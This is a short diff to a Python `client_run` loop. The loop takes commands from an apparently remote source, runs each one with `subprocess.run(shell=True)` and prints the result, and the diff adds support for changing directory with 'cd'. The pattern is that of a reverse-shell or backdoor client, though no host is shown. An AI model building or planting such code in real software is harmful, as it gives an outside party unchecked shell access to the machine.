@@ -33,6 +33,10 @@ def client_run():
     while True:
         cmd = receive()
         if cmd:
+            if cmd.startswith("cd "):
+                goTo = cmd[3:]
+                os.chdir(goTo)
+                continue
             print(f"Received: {cmd}")
             result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
             print(f"Result: {result.stdout}")
